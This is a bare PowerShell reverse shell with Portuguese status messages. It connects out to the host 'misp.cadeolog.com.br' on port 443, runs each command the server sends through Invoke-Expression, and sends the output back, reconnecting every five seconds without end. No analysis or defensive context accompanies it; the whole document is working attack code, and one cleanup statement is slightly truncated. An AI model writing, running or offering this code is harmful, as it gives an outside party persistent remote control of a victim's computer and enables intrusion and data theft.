function Create-Connection { param([string]$ip, [int]$port) try { $client = New-Object System.Net.Sockets.TcpClient; $client.Connect($ip, $port); return $client } catch { Write-Output "Erro ao conectar: $_"; return $null } }; while ($true) { $client = Create-Connection -ip 'misp.cadeolog.com.br' -port 443; if (-not $client) { Start-Sleep -Seconds 5; continue }; $stream = $client.GetStream(); while ($true) { try { $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $cmd = $reader.ReadLine(); if (-not $cmd) { Write-Output "Conexo fechada pelo servidor."; break }; if ([string]::IsNullOrWhiteSpace($cmd)) { $writer.WriteLine("Erro: Comando vazio recebido"); $writer.Flush() } else { try { $output = Invoke-Expression $cmd 2>&1 | Out-String; $writer.WriteLine($output); $writer.Flush() } catch { $writer.WriteLine("Erro ao executar comando: $($_.Exception.Message)"); $writer.Flush() } } } catch { Write-Output "Erro: $_. Tentando reconectar..."; if ($stream) { $stream.Clos}; if ($client) { $client.Close() }; break }; }; Start-Sleep -Seconds 5 }
